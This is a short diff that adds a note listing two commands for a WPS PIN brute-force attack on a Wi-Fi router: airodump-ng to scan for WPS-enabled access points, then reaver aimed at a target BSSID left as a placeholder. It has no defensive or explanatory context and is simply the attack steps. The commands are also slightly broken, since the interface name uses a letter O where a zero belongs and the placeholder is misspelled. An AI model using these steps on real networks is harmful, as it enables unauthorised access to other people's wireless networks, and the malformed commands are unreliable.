@@ -1,0 +1,4 @@
+I want to write the following steps by steps.
+
+1. airodump-ng --wps wlanOmon
+2. reaver -i wlanOmon -b (your add adress) -c 1 -f -a -w -vv
